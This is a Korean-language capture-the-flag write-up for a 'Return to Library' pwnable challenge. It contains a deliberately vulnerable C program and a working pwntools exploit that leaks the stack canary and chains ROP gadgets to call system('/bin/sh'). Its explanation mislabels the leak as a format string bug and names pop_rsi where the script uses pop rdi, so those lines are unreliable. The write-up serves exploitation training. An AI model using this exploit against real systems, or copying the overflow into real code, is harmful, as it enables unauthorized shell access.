# 🚩 [Return to Library]

> **Category:** Pwnable  
> **Difficulty:** <span style="color: #CD7F32; font-weight: bold;">B1</span>  
> **Flag:** `DH{--}`  

---

## 📄 1. Challenge Description
* **Environment :**
  ```text
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
* **Reference :**
  ```text
    Return to Library
---

## 🔍 2. Vulnerability Analysis

이 문제는 **Stack Smashing Protector(Canary)**가 적용되어 있고 NX기법이 적용되어 있어 단순 BOF로 `RET`를 덮어쓰면 NX로 인해 프로그램이 터집니다. 따라서 **1) Canary Leak** 후 **2) Return to Library**를 수행해야 합니다.

### Code Review & Vulnerable Points
C 언어 의사 코드(Decompiled Code) 및 핵심 메뉴 기능 분석:

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
## 🗡️ 3. Exploit Scenario (공격 시나리오)

1. **`Leak Canary` 부분 사용:**
   * `Buf`를 이용해 Canary의 \x00부분까지 덮습니다.
   * `printf`의 `%s`(\x00까지 프린트 해줌)를 이용하여 canary값을 불러옵니다.

2. **`Overwrite return address` 부분 사용:**
   * `Payload = Dummy + Canary + Dummy + pop_rdi + /bin/sh + ret + system@plt` 형태로 페이로드를 구성하여 전송합니다.

3. **Shell 획득 및 Flag 획득**

---

## 💥 4. Exploit Script (`ex.py`)

```python
from pwn import *

p = process("./rtl")
#p=remote("host3.dreamhack.games",8444)
#print(f"PID : {p.pid}")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

e = ELF("./rtl")
r = ROP("./rtl")

# Canary leak
payload = b'a' * 0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary=u64(b'\x00' + p.recvn(7))
slog('canary', canary)

plt = e.plt["system"]
slog("plt", plt)

binsh = next(e.search(b"/bin/sh"))
slog("binsh", binsh)

pop = r.find_gadget(["pop rdi"])[0]
ret = r.find_gadget(["ret"])[0]
slog("pop", pop)
slog("ret", ret)

#shell 획득
payload = b'a' * 0x38
payload += p64(canary)
payload += b'a' * 0x8
payload += p64(pop)
payload += p64(binsh)
payload += p64(ret)
payload += p64(plt)

p.sendafter(b'Buf: ', payload)

p.interactive()
```
---




## 💡 5. Code Analysis & Deep Dive (주요 포인트 분석)

* **Canary Leak (FSB 이용):**
  * `%s`가 `\x00` 이 나올 때 까지 출력을 해주니 `Buf`로 Canary의 첫 바이트 `\x00`값을 덮어주면 바로 다음 Canary값을 그대로 출력할 수 있다.
* **Payload Structure:**
  * `Dummy` + `Canary` + `Dummy` + `pop_rsi` + `/bin/sh` + `ret` + `system`
  * 가젯을 이용하여 NX기법을 성공적으로 우회하였습니다.

---

## 🎓 6. Retrospective / Takeaways (요약 및 느낀 점)

* FSB로 Canary Leak을 배웠다.
* 가젯을 활용하여 NX기법 우회하는 법을 알았다.
